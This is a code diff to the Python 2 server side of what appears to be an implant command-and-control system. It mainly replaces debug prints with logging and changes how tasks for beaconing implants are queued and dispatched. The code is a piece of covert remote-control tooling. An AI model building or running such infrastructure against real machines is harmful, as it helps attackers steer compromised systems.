@@ -50,10 +50,12 @@ class ImplantTaskQueue(dict):
         super(ImplantTaskQueue, self).__delitem__(key)
 
     def add_task(self, implant_uuid, task):
-        print "Add task: %s ==> %s" % (implant_uuid, task)
-        print "implant_uuid type: %s" % type(implant_uuid)
         if implant_uuid not in self.keys():
             self[implant_uuid] = list()
+        if task in self[implant_uuid]:
+            return
+
+        print "Add task: %s ==> %s" % (implant_uuid, task)
         self[implant_uuid].append(task)
 
     def remove_task(self, implant_uuid, task):
@@ -64,11 +66,7 @@ class ImplantTaskQueue(dict):
         api.remove_task(implant_uuid, task['id'])
 
     def get_next_task(self, implant_uuid):
-        print "check for tasks: %s" % implant_uuid
-        print "implant_uuid type: %s" % type(implant_uuid)
-        print self.__dict__
         if implant_uuid in self.keys():
-            print "Found task for %s => %s" % (implant_uuid, self[implant_uuid][0])
             return self[implant_uuid][0]
         return None
 
@@ -120,7 +118,7 @@ class LP(Daemon):
                         beacon = self.extract_beacon_from_packet(
                             packet[0], data_map_list)
                     except:
-                        print "Error trying to extract beacon"
+                        self._log("Error trying to extract beacon")
                         return
 
                     self._log("Received beacon: %s" % beacon)
@@ -128,14 +126,12 @@ class LP(Daemon):
                     # Process any queued tasking for this implant
                     task = self.task_queue.get_next_task(beacon.uuid)
                     if task:
-                        print "Beacon has tasking: %s" % task
+                        self.task_queue.remove_task(beacon.uuid, task)
                         self.send_implant_task(
                             pkt,
                             beacon_data['response_data_type'],
                             json.loads(beacon_data['response_data_mapping']),
                             task)
-                        self.task_queue.remove_task(beacon.uuid, task)
-
                     self.send_beacon_to_controller(beacon)
 
     def send_implant_task(
@@ -206,8 +202,6 @@ class LP(Daemon):
                             data_size = 0
                     if beacon_field == 'data_length' and not (
                             (beacon.type & 0xf) == BEACON_TYPES['data']):
-                        print "XXXXXXXXXX Not a data type beacon"
-                        print "beacon.type & 0xf: ", hex(beacon.type & 0xf)
                         beacon['%s' % beacon_field] = 0
                         continue
 
@@ -222,8 +216,8 @@ class LP(Daemon):
                         #    offset:offset+data_size]
                         beacon['%s' % beacon_field] = value
                         self._log("beacon[%s] => %s" % (beacon_field, packet_field_value[offset:offset+data_size].encode('hex')))
-                    except MalformedBeacon, e:
-                        print "Malformed Beacon: ", e
+                    except MalformedBeacon:
+                        self._log("Malformed Beacon:")
                         break
 
                     offset += data_size
